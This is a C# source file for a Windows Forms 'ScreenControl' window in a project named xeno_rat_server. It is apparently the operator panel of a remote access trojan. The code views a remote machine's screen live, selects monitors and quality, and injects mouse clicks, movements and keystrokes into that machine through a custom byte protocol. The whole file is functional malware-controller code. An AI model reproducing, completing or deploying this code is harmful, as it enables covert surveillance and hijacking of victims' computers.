using System;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace xeno_rat_server.Forms
{
    public partial class ScreenControl : Form
    {
        private readonly Node client;
        private Node imageNode;
        private bool playing = false;
        private int monitorIndex = 0;
        private double scalingFactor = 1;
        private Size? currentMonSize = null;
        private readonly string[] qualities = new string[] { "100%", "90%", "80%", "70%", "60%", "50%", "40%", "30%", "20%", "10%" };

        public ScreenControl(Node _client)
        {
            client = _client;
            InitializeComponent();
            client.AddTempOnDisconnect(TempOnDisconnect);
            comboBox2.Items.AddRange(qualities);
            InitializeAsync();
        }

        private async Task InitializeAsync()
        {
            imageNode = await CreateImageNode();
            imageNode.AddTempOnDisconnect(TempOnDisconnect);
            await RefreshMonitors();
            await RecvThread();
        }

        public void TempOnDisconnect(Node node)
        {
            if (node == client || (node == imageNode && imageNode != null))
            {
                client?.Disconnect();
                imageNode?.Disconnect();
                if (!IsDisposed)
                {
                    Invoke((MethodInvoker)(() => Close()));
                }
            }
        }

        public async Task RefreshMonitors()
        {
            string[] monitors = await GetMonitors();
            comboBox1.Items.Clear();
            comboBox1.Items.AddRange(monitors);
            button2.Enabled = monitors.Length > 0;
            if (monitors.Length > 0)
            {
                await SetMonitor(0);
            }
        }

        public async Task StartCapture()
        {
            await client.SendAsync(new byte[] { 0 });
        }

        public async Task StopCapture()
        {
            await client.SendAsync(new byte[] { 1 });
        }

        public async Task<string[]> GetMonitors()
        {
            await client.SendAsync(new byte[] { 2 });
            string monsString = Encoding.UTF8.GetString(await client.ReceiveAsync());
            return monsString.Split('\n');
        }

        public async Task SetQuality(int quality)
        {
            await client.SendAsync(client.sock.Concat(new byte[] { 3 }, client.sock.IntToBytes(quality)));
        }

        public async Task SetMonitor(int monitorIndex)
        {
            this.monitorIndex = monitorIndex;
            await client.SendAsync(client.sock.Concat(new byte[] { 4 }, client.sock.IntToBytes(monitorIndex)));
            byte[] hwData = await client.ReceiveAsync();
            int width = client.sock.BytesToInt(hwData);
            int height = client.sock.BytesToInt(hwData, 4);
            currentMonSize = new Size(width, height);
            UpdateScaleSize();
        }

        public async Task UpdateScaleSize()
        {
            if (pictureBox1.Width > currentMonSize?.Width || pictureBox1.Height > currentMonSize?.Height)
            {
                await client.SendAsync(client.sock.Concat(new byte[] { 13 }, client.sock.IntToBytes(10000)));
            }
            else
            {
                double widthRatio = (double)pictureBox1.Width / currentMonSize?.Width ?? 1;
                double heightRatio = (double)pictureBox1.Height / currentMonSize?.Height ?? 1;
                scalingFactor = Math.Max(widthRatio, heightRatio);
                int factor = (int)(scalingFactor * 10000.0);
                await client.SendAsync(client.sock.Concat(new byte[] { 13 }, client.sock.IntToBytes(factor)));
            }
        }

        public async Task RecvThread()
        {
            while (imageNode.Connected())
            {
                byte[] data = await imageNode.ReceiveAsync();
                if (data == null)
                {
                    break;
                }
                if (playing)
                {
                    try
                    {
                        using (MemoryStream ms = new MemoryStream(data))
                        {
                            pictureBox1.BeginInvoke((MethodInvoker)(() =>
                            {
                                if (pictureBox1.Image != null)
                                {
                                    pictureBox1.Image.Dispose();
                                    pictureBox1.Image = null;
                                }
                                pictureBox1.Image = Image.FromStream(ms);
                            }));
                        }
                    }
                    catch { }
                }
            }
        }

        private async Task<Node> CreateImageNode()
        {
            if (imageNode != null)
            {
                return imageNode;
            }

            Node subSubNode = await client.Parent.CreateSubNodeAsync(2);
            int id = await Utils.SetType2setIdAsync(subSubNode);
            if (id != -1)
            {
                await Utils.Type2returnAsync(subSubNode);
                byte[] a = subSubNode.sock.IntToBytes(id);
                await client.SendAsync(a);
                byte[] found = await client.ReceiveAsync();
                if (found == null || found[0] == 0)
                {
                    subSubNode.Disconnect();
                    return null;
                }
            }
            else
            {
                subSubNode.Disconnect();
                return null;
            }

            return subSubNode;
        }

        private void ScreenControl_Load(object sender, EventArgs e)
        {
        }

        private async void button2_Click(object sender, EventArgs e)
        {
            await StartCapture();
            playing = true;
        }

        private async void button3_Click(object sender, EventArgs e)
        {
            await StopCapture();
            playing = false;
        }

        private async void button1_Click(object sender, EventArgs e)
        {
            await RefreshMonitors();
        }

        private async void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            int selectedIndex = comboBox1.SelectedIndex;
            if (selectedIndex != -1)
            {
                await SetMonitor(selectedIndex);
            }
        }

        private async void comboBox2_SelectedIndexChanged(object sender, EventArgs e)
        {
            int selectedIndex = comboBox2.SelectedIndex;
            if (selectedIndex != -1)
            {
                await SetQuality(int.Parse(qualities[selectedIndex].Replace("%", "")));
            }
        }

        private async void pictureBox1_MouseClick(object sender, MouseEventArgs e)
        {
            if (pictureBox1.Image == null || !playing || !checkBox1.Checked) return;
            Point coords = TranslateCoordinates(new Point(e.X, e.Y), currentMonSize ?? Size.Empty, pictureBox1);
            byte opcode = 5;
            if (e.Button == MouseButtons.Right)
            {
                opcode = 9;
            }
            else if (e.Button == MouseButtons.Middle)
            {
                opcode = 10;
            }
            byte[] payload = client.sock.Concat(new byte[] { opcode }, client.sock.IntToBytes(coords.X));
            payload = client.sock.Concat(payload, client.sock.IntToBytes(coords.Y));
            await client.SendAsync(payload);
        }

        private async void pictureBox1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (currentMonSize == null || pictureBox1.Image == null || !playing || e.Button == MouseButtons.Right || e.Button == MouseButtons.Middle || !checkBox1.Checked) return;
            Point coords = TranslateCoordinates(new Point(e.X, e.Y), currentMonSize.Value, pictureBox1);
            byte[] payload = client.sock.Concat(new byte[] { 6 }, client.sock.IntToBytes(coords.X));
            payload = client.sock.Concat(payload, client.sock.IntToBytes(coords.Y));
            await client.SendAsync(payload);
        }

        private async void pictureBox1_MouseUp(object sender, MouseEventArgs e)
        {
            if (currentMonSize == null || pictureBox1.Image == null || !playing || e.Button == MouseButtons.Right || e.Button == MouseButtons.Middle || !checkBox1.Checked) return;
            Point coords = TranslateCoordinates(new Point(e.X, e.Y), currentMonSize.Value, pictureBox1);
            byte[] payload = client.sock.Concat(new byte[] { 7 }, client.sock.IntToBytes(coords.X));
            payload = client.sock.Concat(payload, client.sock.IntToBytes(coords.Y));
            await client.SendAsync(payload);
        }

        private async void pictureBox1_MouseMove(object sender, MouseEventArgs e)
        {
            if (currentMonSize == null || pictureBox1.Image == null || !playing || !checkBox1.Checked) return;
            Point coords = TranslateCoordinates(new Point(e.X, e.Y), currentMonSize.Value, pictureBox1);
            byte[] payload = client.sock.Concat(new byte[] { 11 }, client.sock.IntToBytes(coords.X));
            payload = client.sock.Concat(payload, client.sock.IntToBytes(coords.Y));
            await client.SendAsync(payload);
        }

        private async void pictureBox1_MouseDown(object sender, MouseEventArgs e)
        {
            if (currentMonSize == null || pictureBox1.Image == null || !playing || e.Button == MouseButtons.Right || e.Button == MouseButtons.Middle || !checkBox1.Checked) return;
            Point coords = TranslateCoordinates(new Point(e.X, e.Y), currentMonSize.Value, pictureBox1);
            byte[] payload = client.sock.Concat(new byte[] { 8 }, client.sock.IntToBytes(coords.X));
            payload = client.sock.Concat(payload, client.sock.IntToBytes(coords.Y));
            await client.SendAsync(payload);
        }

        private async void ScreenControl_KeyUp(object sender, KeyEventArgs e)
        {
            if (currentMonSize == null || pictureBox1.Image == null || !playing || !checkBox1.Checked) return;
            await client.SendAsync(client.sock.Concat(new byte[] { 12 }, client.sock.IntToBytes(e.KeyValue)));
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            checkBox1.Text = checkBox1.Checked ? "Enabled" : "Disabled";
        }

        private void pictureBox1_SizeChanged(object sender, EventArgs e)
        {
            UpdateScaleSize();
        }

        private Point TranslateCoordinates(Point originalCoords, Size originalScreenSize, PictureBox targetControl)
        {
            float scaleX = (float)targetControl.Image.Width / originalScreenSize.Width;
            float scaleY = (float)targetControl.Image.Height / originalScreenSize.Height;
            int scaledX = (int)(originalCoords.X * scaleX / scalingFactor);
            int scaledY = (int)(originalCoords.Y * scaleY / scalingFactor);
            return UnzoomedAndAdjusted(targetControl, new Point(scaledX, scaledY));
        }

        private Point UnzoomedAndAdjusted(PictureBox pictureBox, Point scaledPoint)
        {
            float zoomFactor = Math.Min(
                (float)pictureBox.ClientSize.Width / pictureBox.Image.Width,
                (float)pictureBox.ClientSize.Height / pictureBox.Image.Height);

            Rectangle displayedRect = GetImageDisplayRectangle(pictureBox);
            int translatedX = (int)((scaledPoint.X - displayedRect.X) / zoomFactor);
            int translatedY = (int)((scaledPoint.Y - displayedRect.Y) / zoomFactor);
            return new Point(translatedX, translatedY);
        }

        private Rectangle GetImageDisplayRectangle(PictureBox pictureBox)
        {
            if (pictureBox.SizeMode == PictureBoxSizeMode.Normal)
            {
                return new Rectangle(0, 0, pictureBox.Image.Width, pictureBox.Image.Height);
            }
            else if (pictureBox.SizeMode == PictureBoxSizeMode.StretchImage)
            {
                return pictureBox.ClientRectangle;
            }
            else
            {
                float zoomFactor = Math.Min(
                    (float)pictureBox.ClientSize.Width / pictureBox.Image.Width,
                    (float)pictureBox.ClientSize.Height / pictureBox.Image.Height);

                int imageWidth = (int)(pictureBox.Image.Width * zoomFactor);
                int imageHeight = (int)(pictureBox.Image.Height * zoomFactor);
                int imageX = (pictureBox.ClientSize.Width - imageWidth) / 2;
                int imageY = (pictureBox.ClientSize.Height - imageHeight) / 2;
                return new Rectangle(imageX, imageY, imageWidth, imageHeight);
            }
        }
    }
}
